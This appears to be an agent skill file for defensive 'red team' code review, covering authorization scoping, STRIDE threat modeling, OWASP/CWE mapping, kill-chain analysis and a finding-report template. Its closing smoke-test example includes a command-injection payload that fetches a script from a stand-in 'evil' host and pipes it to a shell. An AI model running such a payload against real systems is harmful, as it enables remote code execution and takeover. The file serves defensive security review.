---
name: red-team
description: |
  Find vulnerabilities in your own codebase by adopting an attacker's mindset. "The best defence is attack." Combines STRIDE threat modeling, OWASP Top 10 / CWE Top 25 mapping, attack-surface enumeration, exploit-chain reasoning, and a kill-chain reporting format.
  For DEFENSIVE use only: hardening code you own or have written authorization to test. Refuses ops against systems without authorization.
  Auto-activates on: "red team", "red-team", "attacker mindset", "find vulnerabilities", "vuln hunt", "vulnerability hunt", "threat model", "attack surface", "security audit", "pentest", "penetration test", "stride", "owasp", "exploit chain", "kill chain", "best defence is attack".
license: MIT
compatibility: Agent-agnostic. Works on any codebase. Optional CLI helpers — semgrep, trufflehog, gitleaks, npm/pnpm/yarn audit, snyk — if present, used in recon.
metadata:
  version: "1.0"
allowed-tools: Read Glob Grep Bash
---

# Red Team — Adversarial Code Review

> "The best defence is attack." Reverse the polarity of code review: stop asking *"is this safe?"* and start asking *"how would I break this?"*

## Authorized Use Only (BLOCKING)

This skill operates in a **defensive** posture. It only performs attacker-style reasoning against:

- Code in the working directory the user opened.
- Systems for which the user has explicit written authorization to test (e.g. they own it, or have a signed pentest scope).

It will **refuse** to:

- Generate exploit payloads aimed at third-party systems.
- Probe live production systems without authorization.
- Bypass detection of services not owned by the user.
- Provide instructions whose only purpose is undetected attack on others.

If scope is unclear, the skill **stops and asks** before proceeding. See `references/scope-and-authorization.md`.

## When To Use

| Situation | Mode | Output |
|-----------|------|--------|
| New feature touching auth / payments / external input | **Threat model** | STRIDE table per asset + mitigations |
| Existing codebase, security posture unknown | **Attack-surface map** | Entry points + reachable assets + risk ranking |
| Specific file / endpoint / function | **Code-level red team** | Vuln list with CWE + exploit chain + severity |
| Pre-release / pre-merge gate | **Kill-chain pass** | Recon → enum → vuln → exploit → impact → remediation |
| Suspected compromise / incident triage | **Indicator hunt** | IoCs in logs/code/deps + persistence vectors |

## Router

| User says | Load reference | Do |
|---|---|---|
| "threat model [X]" / "stride on [X]" | `references/threat-modeling.md` | STRIDE + 4-question framework |
| "attack surface" / "entry points" / "what can be reached" | `references/attack-surface.md` | enumerate inputs/sinks/trust boundaries |
| "find vulnerabilities" / "vuln hunt" / "red team this code" | `references/code-review-protocol.md` | 7-phase adversarial code review |
| "exploit chain" / "how would they get from X to Y" | `references/kill-chain.md` | Lockheed kill chain + MITRE ATT&CK mapping |
| "owasp" / "cwe" / "what category is this" | `references/owasp-cwe.md` | classification + remediation patterns |
| "secrets" / "hardcoded credentials" | `references/secret-hunting.md` | gitleaks/trufflehog + manual patterns |
| "supply chain" / "dependencies" | `references/supply-chain.md` | dep audit + lockfile + typo-squat checks |
| "report" / "writeup" / "findings" | `references/reporting.md` | severity-scored writeup template |

## Core Principle

```
DEFENSIVE REVIEW                  RED-TEAM REVIEW
─────────────────                 ────────────────
"Is this code correct?"           "How do I make this code wrong?"
"Does it handle the case?"        "What case does it fail to handle?"
"Is input validated?"             "What input bypasses this validator?"
"Is auth checked?"                "What path skips the auth check?"
"Is data encrypted?"              "Where is the unencrypted copy?"
                                  "Where is the key?"
```

The skill enforces the right column. Defensive thinking is filtered out during review (it returns during remediation).

## The 7-Phase Protocol

```
┌──────────────┐
│ 0. SCOPE     │  Confirm authorization. Define in/out of scope.
└──────┬───────┘
       ▼
┌──────────────┐
│ 1. RECON     │  Map the codebase. Languages, frameworks, deps, deploy targets.
└──────┬───────┘
       ▼
┌──────────────┐
│ 2. ENUM      │  Enumerate attack surface: entry points, trust boundaries, secrets, sinks.
└──────┬───────┘
       ▼
┌──────────────┐
│ 3. THREAT    │  Apply STRIDE per asset. Map to OWASP Top 10 / CWE Top 25.
│    MODEL     │
└──────┬───────┘
       ▼
┌──────────────┐
│ 4. VULN      │  Code-level search for each threat. Confirm with PoC reasoning.
│    HUNT      │
└──────┬───────┘
       ▼
┌──────────────┐
│ 5. EXPLOIT   │  Chain vulnerabilities — recon → exec → escalate → persist → exfil.
│    CHAIN     │
└──────┬───────┘
       ▼
┌──────────────┐
│ 6. IMPACT    │  Score each chain (CVSS-lite or DREAD). Rank by exploitability + blast.
└──────┬───────┘
       ▼
┌──────────────┐
│ 7. REPORT +  │  Severity-ranked findings + concrete remediation per vuln.
│    REMEDIATE │  Verify fix doesn't introduce regression.
└──────────────┘
```

Each phase has a **stop condition**. If phase N produces nothing, do not skip to N+2 — go back to N-1.

## Phase 0 — Scope (BLOCKING)

Before any reconnaissance:

```
1. WHAT codebase / system / endpoint?
2. WHO authorized this review? (user owns it / written scope / CTF / training)
3. WHAT is OUT of scope? (third-party services, customer data, prod endpoints)
4. WHAT artifact is expected? (writeup / fix list / threat model / PR comments)
```

If any of (1)-(3) is ambiguous, **ask before continuing**. See `references/scope-and-authorization.md`.

## Phase 1 — Recon

Build a structural picture of the target. **Read, don't run.** No code execution against live services.

| Layer | Look for | Tools |
|-------|----------|-------|
| Languages / frameworks | `package.json`, `go.mod`, `pyproject.toml`, `Cargo.toml`, `Gemfile` | `Read`, `Glob` |
| Routes / endpoints | route registrations, decorators, OpenAPI specs | `Grep` for `@route`, `app.get`, `Router`, `mux.Handle` |
| Auth boundary | session / JWT / OAuth / API key / cookie config | `Grep` for `auth`, `session`, `jwt`, `verify` |
| External I/O | network calls, file I/O, shell exec, deserialization | `Grep` for `fetch`, `axios`, `exec`, `eval`, `pickle` |
| Storage | DB clients, ORM, raw SQL, NoSQL drivers | `Grep` for `query`, `find`, `aggregate`, `raw` |
| Secrets / config | env vars, config files, hardcoded literals | `gitleaks` / `trufflehog` / manual `Grep` |
| Deps | direct + transitive, lockfiles, audit reports | `npm audit`, `pnpm audit`, `pip-audit`, `osv-scanner` |
| Deploy target | Dockerfile, k8s, CI/CD, IaC | `Read` of those files |

Output: a one-page recon brief (architecture sketch + attack-surface candidates).

## Phase 2 — Enumerate Attack Surface

For each entry point identified in Recon, classify:

| Class | Examples | Why it matters |
|-------|----------|----------------|
| External (untrusted) | HTTP routes, webhooks, file uploads, RPC, queues consuming external messages | Direct attacker control |
| Internal (semi-trusted) | Internal service calls, admin tools | Lateral movement target |
| Boundary | Auth middleware, validation, parsers, deserializers | Bypass = full surface exposure |
| Sink (dangerous) | DB query, shell exec, file write, template render, eval, subprocess | Where bugs become RCE / SQLi |

Trace each external entry point to each sink. **A path from external entry to a dangerous sink is a candidate vulnerability** until proven otherwise.

See `references/attack-surface.md` for taint-tracing patterns.

## Phase 3 — Threat Model (STRIDE)

For each asset (data store, service, identity), apply **STRIDE**:

| Letter | Threat | Asks |
|--------|--------|------|
| **S** | Spoofing | Can the attacker pretend to be another principal? |
| **T** | Tampering | Can the attacker modify data in transit / at rest / in memory? |
| **R** | Repudiation | Can an action be performed without an attributable log? |
| **I** | Information disclosure | What data leaks if this asset is touched? |
| **D** | Denial of service | What input / load makes this asset unavailable? |
| **E** | Elevation of privilege | What action lets a low-priv principal act as high-priv? |

Then ask Shostack's 4 questions for the system overall:

1. What are we building?
2. What can go wrong? *(STRIDE per asset)*
3. What are we doing about it?
4. Did we do a good job? *(test the mitigations)*

See `references/threat-modeling.md` for the full template.

## Phase 4 — Vuln Hunt (Adversarial Code Review)

For each STRIDE threat, search the code for it. **Reverse the question** — instead of "is X protected?" ask "where is X *not* protected?"

| Threat | Code patterns to search |
|--------|--------------------------|
| Injection | string concatenation in queries, unparameterized SQL, `eval`, `exec`, template-string in shell |
| Auth bypass | route handlers without auth middleware, conditional auth, IDOR (object refs from user input without ownership check) |
| Authz bypass | role checks based on user-controlled input, missing checks on internal endpoints |
| Crypto | `Math.random` for tokens, MD5/SHA1 for passwords, hardcoded keys, no IV / fixed IV |
| Deserialization | `pickle.loads`, `unserialize`, `yaml.load` without `SafeLoader`, JSON revivers with prototype access |
| SSRF | URL fetched from user input, no allowlist, no DNS rebinding mitigation |
| Path traversal | `path.join` with user input + no normalization + no chroot |
| XSS | innerHTML / dangerouslySetInnerHTML / template auto-escape disabled |
| CSRF | mutating routes without CSRF token / SameSite cookie missing |
| Race conditions | check-then-act on shared state, TOCTOU, double-spend on payments |
| Secrets | hardcoded API keys, tokens in logs, secrets in error messages |
| Supply chain | typo-squatted deps, unverified install scripts, postinstall hooks |

Map each finding to **CWE** + **OWASP Top 10** category. See `references/owasp-cwe.md`.

## Phase 5 — Exploit Chain (Lockheed Kill Chain)

Single bugs are interesting. **Chains are dangerous.** Walk through:

```
RECON  →  WEAPONIZE  →  DELIVERY  →  EXPLOIT  →  INSTALL  →  C2  →  ACTIONS
```

For each significant vuln, ask:

1. How would an attacker discover this from outside? (recon)
2. What input triggers it? (weaponize)
3. How does the input arrive? (delivery — endpoint, queue, file upload)
4. What primitive does it grant? (read / write / exec)
5. How does that primitive escalate? (chain to next vuln)
6. How does the attacker maintain access? (persistence — backdoors, scheduled jobs, cron)
7. What's the final action — exfil, ransom, lateral movement?

A vuln that grants only "log noise" is low impact. A vuln that grants RCE is high. A vuln that grants RCE + persistence + exfil is critical.

Map each step to **MITRE ATT&CK** technique IDs where applicable. See `references/kill-chain.md`.

## Phase 6 — Impact (Severity Scoring)

For each chain, score with **DREAD-lite** or **CVSS v3**:

| Dimension | Question | 1 | 3 | 5 |
|-----------|----------|---|---|---|
| **D**amage | Worst-case impact? | minor info leak | data tampering / partial RCE | full RCE / data theft |
| **R**eproducibility | How reliable is the exploit? | rare conditions | sometimes | always |
| **E**xploitability | How hard to execute? | expert + tools | scripted | one curl |
| **A**ffected users | Blast radius? | one user | tenant | all users |
| **D**iscoverability | How easy to find? | source-code-only | logs | externally observable |

Sum: 5-12 = Low, 13-19 = Medium, 20-25 = High/Critical.

Or use CVSS calculator for industry-standard scores.

## Phase 7 — Report + Remediate

Per finding:

```markdown
## [SEV] Title (CWE-XXX, OWASP A0X:2021)

**Asset**: [what's affected]
**Entry point**: [where attacker delivers]
**Sink**: [where damage occurs]
**Path**: file.ts:L23 → file.ts:L45 → other.ts:L12
**Score**: DREAD 22/25 — Critical

### Exploit Chain
1. [step]
2. [step]
3. [final impact]

### Proof of Concept (defensive)
[input/payload that triggers the bug — minimal, no live targets]

### Root Cause
[the actual flaw — not just the symptom]

### Remediation
- [Specific code change. Diff snippet preferred.]
- [Defense-in-depth: secondary mitigation]

### Verification
- [Test that fails before fix, passes after]
- [Regression test for the chain]
```

See `references/reporting.md` for the full template.

## Anti-Patterns (NEVER)

- NEVER skip Phase 0. Authorization is non-negotiable.
- NEVER report a vuln without a path: file:line of entry → file:line of sink.
- NEVER score severity without an exploit chain — a "theoretical" CVE-9 with no reachable path is not a CVE-9.
- NEVER stop at single vulns. Always try to chain. The chain reveals the real impact.
- NEVER recommend remediation without a regression test. The fix must be testable.
- NEVER leak findings to public channels (issues, PRs, chats) before the fix lands. Coordinate disclosure.
- NEVER attack systems out of scope. If the chain crosses a trust boundary you don't own, **stop and report the boundary** — don't cross it.

## Smoke Test

User: *"Red team this Express endpoint: `app.post('/api/run', (req, res) => { exec(req.body.cmd, ...) })`"*

Expected output:

```
SEV: CRITICAL — Command Injection (CWE-78, OWASP A03:2021)
Asset: server shell
Entry: POST /api/run, body.cmd
Sink: child_process.exec(req.body.cmd)
Path: route handler line 1 → exec line 1
Chain:
  1. attacker POSTs {"cmd":"curl evil/sh | sh"}
  2. exec runs in shell context → arbitrary command execution
  3. RCE → install reverse shell → persist → lateral
Severity: DREAD 25/25, CVSS 10.0
Remediation:
  - Remove exec entirely if possible.
  - If shell exec is required: use spawn(args[]) with argv list, not a shell string. Allowlist commands.
  - Add auth + audit log + rate limit.
Verification:
  - Test: POST malicious payload, expect 403 / sanitized rejection.
  - Regression: integration test asserting no shell metacharacters reach exec.
```

## References

- `references/scope-and-authorization.md` — Phase 0 scoping + refusal triggers
- `references/threat-modeling.md` — STRIDE per asset, Shostack 4 questions, data-flow diagrams
- `references/attack-surface.md` — entry points, trust boundaries, taint tracing
- `references/code-review-protocol.md` — 7-phase code review with adversarial questions
- `references/kill-chain.md` — Lockheed kill chain, MITRE ATT&CK mapping, exploit chains
- `references/owasp-cwe.md` — OWASP Top 10 / CWE Top 25 with code patterns + remediation
- `references/secret-hunting.md` — gitleaks, trufflehog, manual patterns, log scrubbing
- `references/supply-chain.md` — dep audit, lockfiles, typo-squat, install-script attacks
- `references/reporting.md` — severity scoring + writeup template
